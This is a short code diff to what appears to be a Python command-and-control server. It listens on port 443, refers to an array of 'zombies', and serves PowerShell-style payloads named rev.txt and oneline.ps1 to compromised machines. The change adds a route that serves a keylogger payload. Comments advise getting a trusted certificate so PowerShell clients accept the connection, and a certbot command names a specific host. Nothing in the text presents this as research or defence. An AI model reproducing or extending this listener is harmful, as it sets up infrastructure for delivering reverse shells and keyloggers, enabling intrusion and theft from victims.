@@ -5,7 +5,7 @@ import cgi
 from http.server import BaseHTTPRequestHandler
 import io
 import json
-
+import config
 
 
 # Array with zombies
@@ -93,6 +93,8 @@ class PostHandler(BaseHTTPRequestHandler):
 		)
 		if self.path == "/rev.txt":
 			f = open("/opt/aldebaran/darma/rev.txt","r")
+		elif self.path == "/key.txt":
+			f = open("/opt/aldebaran/darma/keylogger.txt","r")
 		else:
 			f = open("/opt/aldebaran/darpa/oneline.ps1","r")
 		out.write(str(f.read()))
@@ -109,7 +111,7 @@ def start():
 
 	server = HTTPServer(('0.0.0.0', 443), PostHandler)
 	# Use letsencrypt to generate legitimate cert. PS will flip otherwise.
-	# Copy certs in same directory as liseter.py 
+	# Copy certs in same directory as listener.py 
 	# certbot certonly --manual -d 220.ip-54-37-16.eu -d 220.ip-54-37-16.eu --register-unsafely-without-email
 	server.socket = ssl.wrap_socket (server.socket, 
 	        keyfile="/opt/aldebaran/darma/key.pem", 
